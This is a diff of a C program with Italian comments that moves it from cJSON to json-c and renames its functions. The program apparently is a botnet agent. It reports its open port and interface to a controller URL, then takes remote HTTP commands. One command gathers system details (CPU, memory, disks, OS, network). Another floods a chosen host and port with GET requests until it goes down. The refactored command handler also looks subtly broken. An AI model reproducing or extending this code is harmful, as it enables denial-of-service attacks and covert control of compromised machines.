@@ -5,10 +5,10 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <curl/curl.h>
-#include "cJSON.h"
 #include <ifaddrs.h>
 #include <arpa/inet.h>
-#include <errno.h>
+#include <json-c/json.h>
+
 
 #define MAX_LISTENING_PORTS 1024
 #define JSON_BUFFER_SIZE 1024
@@ -26,19 +26,19 @@ struct ServerInfo {
 };
 
 // Dichiarazione delle funzioni
-int findListeningPorts(int *freePorts, int maxPorts);
+int find_listening_ports(int *freePorts, int maxPorts);
 
-int findWebExposedInterface(struct NetworkInterface *webInterface);
+int find_web_exposed_interface(struct NetworkInterface *webInterface);
 
-int generateRandomPort(const int *listeningPorts, int numListeningPorts);
+int generate_random_port(const int *listeningPorts, int numListeningPorts);
 
-int sendServerInfo(struct ServerInfo *info, const char *serverURL);
+int send_server_info(struct ServerInfo *info, const char *serverURL);
 
-int isPortInList(const int *listeningPorts, int numListeningPorts, int port);
+int is_port_in_list(const int *listeningPorts, int numListeningPorts, int port);
 
-int startServer(int port);
+int start_server(int port);
 
-int handlePostRequest(int clientSocket);
+int handle_post_request(int client_socket);
 
 int main(int argc, char *argv[]) {
     if (argc != 2) {
@@ -52,19 +52,19 @@ int main(int argc, char *argv[]) {
     struct NetworkInterface webInterface;
     struct ServerInfo serverInfo;
 
-    int numListeningPorts = findListeningPorts(freePorts, MAX_LISTENING_PORTS);
+    int numListeningPorts = find_listening_ports(freePorts, MAX_LISTENING_PORTS);
     if (numListeningPorts == -1) {
         fprintf(stderr, "Errore durante la ricerca delle porte in ascolto.\n");
         return 1;
     }
 
-    int result = findWebExposedInterface(&webInterface);
+    int result = find_web_exposed_interface(&webInterface);
     if (result == -1) {
         fprintf(stderr, "Errore durante la ricerca dell'interfaccia esposta sul web.\n");
         return 1;
     }
 
-    int randomPort = generateRandomPort(freePorts, numListeningPorts);
+    int randomPort = generate_random_port(freePorts, numListeningPorts);
     if (randomPort == -1) {
         fprintf(stderr, "Nessuna porta libera disponibile.\n");
         return 1;
@@ -77,7 +77,7 @@ int main(int argc, char *argv[]) {
 
 
     // Invia le informazioni al server HTTP utilizzando l'URL passato come argomento
-    result = sendServerInfo(&serverInfo, serverURL);
+    result = send_server_info(&serverInfo, serverURL);
     if (result == -1) {
         fprintf(stderr, "Errore nell'invio delle informazioni al server HTTP.\n");
         return 1;
@@ -86,7 +86,7 @@ int main(int argc, char *argv[]) {
     // Avvia il server sulla porta specificata nel JSON
     if (serverInfo.numPorts > 0) {
         int serverPort = serverInfo.ports[0]; // Assume che ci sia almeno una porta nell'array
-        result = startServer(serverPort);
+        result = start_server(serverPort);
         if (result == -1) {
             fprintf(stderr, "Errore nell'avvio del server sulla porta %d\n", serverPort);
             return 1;
@@ -96,7 +96,7 @@ int main(int argc, char *argv[]) {
     return 0;
 }
 
-int findListeningPorts(int *freePorts, int maxPorts) {
+int find_listening_ports(int *freePorts, int maxPorts) {
     int numFreePorts = 0;
 
     for (int port = 1024; port <= 65535 && numFreePorts < maxPorts; ++port) {
@@ -124,7 +124,7 @@ int findListeningPorts(int *freePorts, int maxPorts) {
 }
 
 
-int findWebExposedInterface(struct NetworkInterface *webInterface) {
+int find_web_exposed_interface(struct NetworkInterface *webInterface) {
     struct ifaddrs *ifaddr, *ifa;
 
     if (getifaddrs(&ifaddr) == -1) {
@@ -171,7 +171,7 @@ int findWebExposedInterface(struct NetworkInterface *webInterface) {
     return -1; // Nessuna interfaccia esposta sul web trovata
 }
 
-int isPortInList(const int *listeningPorts, int numListeningPorts, int port) {
+int is_port_in_list(const int *listeningPorts, int numListeningPorts, int port) {
     for (int i = 0; i < numListeningPorts; i++) {
         if (listeningPorts[i] == port) {
             return 1;  // La porta è nella lista
@@ -180,7 +180,7 @@ int isPortInList(const int *listeningPorts, int numListeningPorts, int port) {
     return 0;  // La porta non è nella lista
 }
 
-int generateRandomPort(const int *listeningPorts, int numListeningPorts) {
+int generate_random_port(const int *listeningPorts, int numListeningPorts) {
     srand(time(NULL));  // Inizializza il generatore di numeri casuali con il tempo corrente
 
     int maxPort = 65535;  // La porta massima consentita
@@ -194,7 +194,7 @@ int generateRandomPort(const int *listeningPorts, int numListeningPorts) {
         randomPort = minPort + (rand() % (maxPort - minPort + 1));
 
         // Verifica se la porta è nella lista delle porte in ascolto
-        if (!isPortInList(listeningPorts, numListeningPorts, randomPort)) {
+        if (!is_port_in_list(listeningPorts, numListeningPorts, randomPort)) {
             return randomPort;  // Restituisci la porta casuale
         }
 
@@ -210,7 +210,7 @@ size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
     return size * nmemb;
 }
 
-int sendServerInfo(struct ServerInfo *info, const char *serverURL) {
+int send_server_info(struct ServerInfo *info, const char *serverURL) {
     CURL *curl;
     CURLcode res;
 
@@ -264,7 +264,7 @@ int sendServerInfo(struct ServerInfo *info, const char *serverURL) {
     return 0;  // Successo nell'invio delle informazioni al server HTTP
 }
 
-int startServer(int port) {
+int start_server(int port) {
     int sockfd, newsockfd;
     socklen_t clilen;
     struct sockaddr_in serv_addr, cli_addr;
@@ -306,7 +306,7 @@ int startServer(int port) {
         }
 
         // Gestisci la richiesta POST
-        if (handlePostRequest(newsockfd) == -1) {
+        if (handle_post_request(newsockfd) == -1) {
 //            fprintf(stderr, "Errore nella gestione della richiesta POST\n");
         }
 
@@ -320,80 +320,74 @@ int startServer(int port) {
     return 0;
 }
 
-cJSON *getInfo() {
-    cJSON *infoJson = cJSON_CreateObject();
+json_object *get_info() {
+    json_object *infoJson = json_object_new_object();
 
-    // Esegui il comando completo "lscpu" e ottieni l'output
     FILE *lscpuFile = popen("lscpu", "r");
     if (lscpuFile) {
         char result[512];
-        char lscpuOutput[4096] = ""; // Aumentato il buffer
+        char lscpuOutput[4096] = "";
         while (fgets(result, sizeof(result), lscpuFile) != NULL) {
             strcat(lscpuOutput, result);
         }
-        cJSON_AddStringToObject(infoJson, "infoCPU", lscpuOutput);
+        json_object_object_add(infoJson, "infoCPU", json_object_new_string(lscpuOutput));
         pclose(lscpuFile);
     }
 
-    // Esegui il comando completo "free" e ottieni l'output
     FILE *freeFile = popen("free", "r");
     if (freeFile) {
         char result[512];
-        char freeOutput[4096] = ""; // Aumentato il buffer
+        char freeOutput[4096] = "";
         while (fgets(result, sizeof(result), freeFile) != NULL) {
             strcat(freeOutput, result);
         }
-        cJSON_AddStringToObject(infoJson, "infoRAM", freeOutput);
+        json_object_object_add(infoJson, "infoRAM", json_object_new_string(freeOutput));
         pclose(freeFile);
     }
 
-    // Esegui il comando completo "df -h" e ottieni l'output
     FILE *dfFile = popen("df -h", "r");
     if (dfFile) {
         char result[512];
-        char dfOutput[4096] = ""; // Aumentato il buffer
+        char dfOutput[4096] = "";
         while (fgets(result, sizeof(result), dfFile) != NULL) {
             strcat(dfOutput, result);
         }
-        cJSON_AddStringToObject(infoJson, "infoHD", dfOutput);
+        json_object_object_add(infoJson, "infoHD", json_object_new_string(dfOutput));
         pclose(dfFile);
     }
 
-    // Esegui il comando completo "uname -a" e ottieni l'output
     FILE *unameFile = popen("uname -a", "r");
     if (unameFile) {
         char result[512];
-        char unameOutput[4096] = ""; // Aumentato il buffer
+        char unameOutput[4096] = "";
         while (fgets(result, sizeof(result), unameFile) != NULL) {
             strcat(unameOutput, result);
         }
-        cJSON_AddStringToObject(infoJson, "infoOS", unameOutput);
+        json_object_object_add(infoJson, "infoOS", json_object_new_string(unameOutput));
         pclose(unameFile);
     }
 
-    // Esegui il comando completo "ip a" e ottieni l'output
     FILE *ipAFile = popen("ip a", "r");
     if (ipAFile) {
         char result[512];
-        char ifconfigOutput[4096] = ""; // Aumentato il buffer
+        char ifconfigOutput[4096] = "";
         while (fgets(result, sizeof(result), ipAFile) != NULL) {
             strcat(ifconfigOutput, result);
         }
-        cJSON_AddStringToObject(infoJson, "infoNetwork", ifconfigOutput);
+        json_object_object_add(infoJson, "infoNetwork", json_object_new_string(ifconfigOutput));
         pclose(ipAFile);
     }
 
     return infoJson;
 }
 
+int send_get_request_to_the_target(json_object *json) {
+    json_object *hostnameItem = NULL;
+    json_object *portItem = NULL;
 
-int sendGetRequestsToTarget(cJSON *json) {
-    cJSON *hostnameItem = cJSON_GetObjectItem(json, "hostname");
-    cJSON *portItem = cJSON_GetObjectItem(json, "port");
-
-    if (hostnameItem != NULL && portItem != NULL) {
-        const char *hostname = hostnameItem->valuestring;
-        const char *port = portItem->valuestring;
+    if (json_object_object_get_ex(json, "hostname", &hostnameItem) && json_object_object_get_ex(json, "port", &portItem)) {
+        const char *hostname = json_object_get_string(hostnameItem);
+        const char *port = json_object_get_string(portItem);
         printf("hostname %s\n", hostname);
         printf("port %s\n", port);
 
@@ -401,11 +395,9 @@ int sendGetRequestsToTarget(cJSON *json) {
         int targetAlive = 1;
 
         while (targetAlive) {
-            // Crea l'URL con l'hostname e la porta specificati
             char url[100];
             snprintf(url, sizeof(url), "http://%s:%s", hostname, port);
 
-            // Esegui la richiesta HTTP GET all'URL
             CURL *curl;
             CURLcode res;
 
@@ -413,21 +405,16 @@ int sendGetRequestsToTarget(cJSON *json) {
 
             curl = curl_easy_init();
             if (curl) {
-                // Imposta l'URL
                 curl_easy_setopt(curl, CURLOPT_URL, url);
-
-                // Imposta la richiesta HTTP come GET
                 curl_easy_setopt(curl, CURLOPT_HTTPGET, 1);
 
-                // Esegui la richiesta GET
                 res = curl_easy_perform(curl);
                 if (res != CURLE_OK) {
-                    targetAlive = 0; // Il target non ha risposto, interrompi il loop
+                    targetAlive = 0;
                 } else {
                     printf("Sent GET request to %s\n", url);
                 }
 
-                // Chiudi la sessione CURL
                 curl_easy_cleanup(curl);
             }
 
@@ -440,90 +427,65 @@ int sendGetRequestsToTarget(cJSON *json) {
     return 1;
 }
 
-int handlePostRequest(int clientSocket) {
+
+int handle_post_request(int client_socket) {
     char buffer[MAX_REQUEST_SIZE];
     ssize_t bytesRead;
 
     memset(buffer, 0, sizeof(buffer));
 
-    // Leggi i dati inviati dal client (richiesta POST)
-    bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0);
+    bytesRead = recv(client_socket, buffer, sizeof(buffer), 0);
 
     if (bytesRead == -1) {
         perror("Errore nella lettura della richiesta del client");
         return -1;
     }
 
-    // Trova i dati POST (supponendo una richiesta semplice senza chunking)
     char *data = strstr(buffer, "\r\n\r\n");
     if (data == NULL) {
-//        fprintf(stderr, "Errore nei dati POST: dati mancanti o formato non supportato\n");
         return -1;
     }
 
-    data += 4; // Avanza oltre la sequenza "\r\n\r\n"
+    data += 4;
 
-    // Analizza il JSON utilizzando libcjson
-    cJSON *json = cJSON_Parse(data);
+    json_object *json = json_tokener_parse(data);
     if (json == NULL) {
         fprintf(stderr, "Errore nel parsing del JSON\n");
-        // Invia una risposta con codice di stato 500
         char response[] = "HTTP/1.1 500 Internal Server Error\r\n\r\n";
-        send(clientSocket, response, strlen(response), 0);
+        send(client_socket, response, strlen(response), 0);
         return -1;
     }
 
-    cJSON *commandItem = cJSON_GetObjectItem(json, "command");
-    if (!cJSON_IsString(commandItem)) {
-        fprintf(stderr, "Errore: campo 'command' non presente o non è una stringa\n");
-        cJSON_Delete(json);
-        // Invia una risposta con codice di stato 500
-        char response[] = "HTTP/1.1 500 Internal Server Error\r\n\r\n";
-        send(clientSocket, response, strlen(response), 0);
-        return -1;
+    json_object *commandItem = NULL;
+    if (json_object_object_get_ex(json, "command", &commandItem)) {
+        const char *command = json_object_get_string(commandItem);
+        json_object *responseJson = json_object_new_object();
+
+        if (strcmp(command, "get info") == 0) {
+            json_object *infoJson = get_info();
+            json_object_object_add(responseJson, "infoCPU", json_object_get(infoJson));
+            json_object_object_add(responseJson, "infoRAM", json_object_get(infoJson));
+            json_object_object_add(responseJson, "infoHD", json_object_get(infoJson));
+            json_object_object_add(responseJson, "infoOS", json_object_get(infoJson));
+            json_object_object_add(responseJson, "infoNetwork", json_object_get(infoJson));
+            json_object_put(infoJson);
+        } else if (strcmp(command, "request") == 0) {
+            send_get_request_to_the_target(json);
+        } else {
+            json_object_object_add(responseJson, "error", json_object_new_string("Comando sconosciuto"));
+            char response[] = "HTTP/1.1 500 Internal Server Error\r\n\r\n";
+            send(client_socket, response, strlen(response), 0);
+        }
+
+        const char *responseString = json_object_to_json_string(responseJson);
+        char responseHeader[256];
+        snprintf(responseHeader, sizeof(responseHeader),
+                 "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %zu\r\n\r\n",
+                 strlen(responseString));
+        send(client_socket, responseHeader, strlen(responseHeader), 0);
+        send(client_socket, responseString, strlen(responseString), 0);
+        json_object_put(json);
     }
-
-    const char *command = commandItem->valuestring;
-
-    cJSON *responseJson = cJSON_CreateObject();
-
-    // Esegui il comando Linux specificato nel campo "command"
-    if (strcmp(command, "get info") == 0) {
-        cJSON *infoJson = getInfo();
-        cJSON_AddItemToObject(responseJson, "infoCPU", cJSON_Duplicate(cJSON_GetObjectItem(infoJson, "infoCPU"), 1));
-        cJSON_AddItemToObject(responseJson, "infoRAM", cJSON_Duplicate(cJSON_GetObjectItem(infoJson, "infoRAM"), 1));
-        cJSON_AddItemToObject(responseJson, "infoHD", cJSON_Duplicate(cJSON_GetObjectItem(infoJson, "infoHD"), 1));
-        cJSON_AddItemToObject(responseJson, "infoOS", cJSON_Duplicate(cJSON_GetObjectItem(infoJson, "infoOS"), 1));
-        cJSON_AddItemToObject(responseJson, "infoNetwork",
-                              cJSON_Duplicate(cJSON_GetObjectItem(infoJson, "infoNetwork"), 1));
-        cJSON_Delete(infoJson);
-    } else if (strcmp(command, "request") == 0) {
-        sendGetRequestsToTarget(json);
-    } else {
-        cJSON_AddStringToObject(responseJson, "error", "Comando sconosciuto");
-        // Invia una risposta con codice di stato 500
-        char response[] = "HTTP/1.1 500 Internal Server Error\r\n\r\n";
-        send(clientSocket, response, strlen(response), 0);
-    }
-
-    // Converti il JSON di risposta in una stringa
-    char *responseString = cJSON_Print(responseJson);
-
-    // Invia l'intestazione HTTP con Content-Type
-    char responseHeader[256];
-    snprintf(responseHeader, sizeof(responseHeader),
-             "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %zu\r\n\r\n",
-             strlen(responseString));
-
-    send(clientSocket, responseHeader, strlen(responseHeader), 0);
-
-    // Invia il corpo della risposta JSON
-    send(clientSocket, responseString, strlen(responseString), 0);
-
-    // Liberare la memoria allocata per il JSON di risposta e la stringa
-    cJSON_Delete(json);
-    cJSON_Delete(responseJson);
-    free(responseString);
 
     return 0;
 }
